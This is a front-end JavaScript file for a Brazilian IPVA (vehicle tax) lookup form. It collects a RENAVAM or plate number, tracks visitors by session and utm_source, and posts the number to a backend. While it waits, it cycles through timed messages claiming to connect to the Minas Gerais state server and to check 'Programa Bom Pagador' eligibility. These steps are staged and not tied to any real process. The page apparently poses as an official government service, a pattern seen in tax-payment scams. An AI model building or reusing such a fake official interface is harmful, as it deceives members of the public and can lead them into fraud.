document.addEventListener('DOMContentLoaded', () => {
    // Track stage 1: Initial form page
    const urlParams = new URLSearchParams(window.location.search);
    const utmSource = urlParams.get('utm_source') || 'Direct';

    // Get or create session ID
    let sessionId = sessionStorage.getItem('session_id');
    if (!sessionId) {
        sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        sessionStorage.setItem('session_id', sessionId);
    }

    // Track initial form stage
    fetch('/api/track_session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            session_id: sessionId,
            stage: 'initial_form',
            utm_source: utmSource
        })
    }).catch(e => console.error('Track error:', e));

    // Carousel Logic
    const images = document.querySelectorAll('.person-img');
    let currentIndex = 0;

    if (images.length > 0) {
        setInterval(() => {
            images[currentIndex].classList.remove('active');
            currentIndex = (currentIndex + 1) % images.length;
            images[currentIndex].classList.add('active');
        }, 4000);
    }

    // Elements
    const form = document.getElementById('consultForm');
    const identifierInput = document.getElementById('identifier');
    const resultOverlay = document.getElementById('resultOverlay');
    const closeResultBtn = document.getElementById('closeResult');

    // Smart Input Mask (RENAVAM ONLY INITIALLY)
    identifierInput.addEventListener('input', (e) => {
        let val = e.target.value.toUpperCase();

        // If placeholder implies Plate (fallback mode), allow letters
        if (identifierInput.placeholder.includes("Placa")) {
            val = val.replace(/[^A-Z0-9]/g, '');
            if (val.length > 7) val = val.slice(0, 7);
        } else {
            // RENAVAM Mode (Numbers Only)
            val = val.replace(/\D/g, ''); // Remove non-numbers
            if (val.length > 11) val = val.slice(0, 11);
        }
        e.target.value = val;
    });

    // Close Modal
    closeResultBtn.addEventListener('click', () => {
        resultOverlay.classList.add('hidden');
    });

    // Helper: Parse Currency to Float
    function parseCurrency(str) {
        if (!str) return 0;
        return parseFloat(str.replace('R$', '').replace(/\./g, '').replace(',', '.').trim());
    }

    // Helper: Format Float to Currency
    function formatCurrency(val) {
        return val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
    }

    // Submit Handler
    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        let identifier = identifierInput.value.trim();

        if (identifier.length < 7) {
            alert("Por favor, digite um Renavam ou Placa válido.");
            return;
        }

        const submitBtn = form.querySelector('button[type="submit"]');
        const originalBtnText = submitBtn.textContent;
        // Show Overlay
        const overlay = document.getElementById('pageLoadingOverlay');
        const msgEl = document.getElementById('loadingMsg');
        overlay.classList.remove('hidden');

        // Disable button background interaction
        submitBtn.disabled = true;

        // Sequence of messages
        const steps = [
            { msg: "Conectando ao servidor do Estado de Minas Gerais...", delay: 0 },
            { msg: "Buscando informações do veículo...", delay: 4000 },
            { msg: "Identificando débitos em aberto...", delay: 10000 },
            { msg: "Verificando qualificação Programa Bom Pagador...", delay: 18000 }
        ];

        let stepTimeouts = [];
        steps.forEach(step => {
            let t = setTimeout(() => {
                if (msgEl) {
                    msgEl.textContent = step.msg;
                    // Reset animation
                    msgEl.style.animation = 'none';
                    msgEl.offsetHeight; /* trigger reflow */
                    msgEl.style.animation = 'fadeText 0.5s ease-in-out';
                }
            }, step.delay);
            stepTimeouts.push(t);
        });

        try {
            // Send as 'plate' to match backend expectation, even if it is a RENAVAM
            const response = await fetch('/api/calculate_ipva', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ plate: identifier })
            });

            const data = await response.json();

            if (data.error) {
                // Clear timeouts
                stepTimeouts.forEach(clearTimeout);
                overlay.classList.add('hidden'); // Hide overlay on error

                if (data.error === "RENAVAM_NOT_FOUND") {
                    alert(data.message); // Ex: "Renavam não encontrado... digite a Placa"
                    identifierInput.value = "";
                    identifierInput.placeholder = "Digite a Placa agora";
                    identifierInput.focus();
                } else {
                    alert(`Erro: ${data.message || data.error}`);
                }
            } else {
                // Success - wait a bit if needed or redirect immediately
                // Save to Session and Redirect
                // Ensure we don't overwrite ownerName if backend provided it
                sessionStorage.setItem('vehicleData', JSON.stringify(data));
                window.location.href = 'resultado.html?t=' + new Date().getTime();
            }

        } catch (err) {
            stepTimeouts.forEach(clearTimeout);
            overlay.classList.add('hidden');
            console.error(err);
            alert("Erro de conexão. Tente novamente.");
        } finally {
            submitBtn.textContent = originalBtnText;
            submitBtn.disabled = false;
        }
    });
});
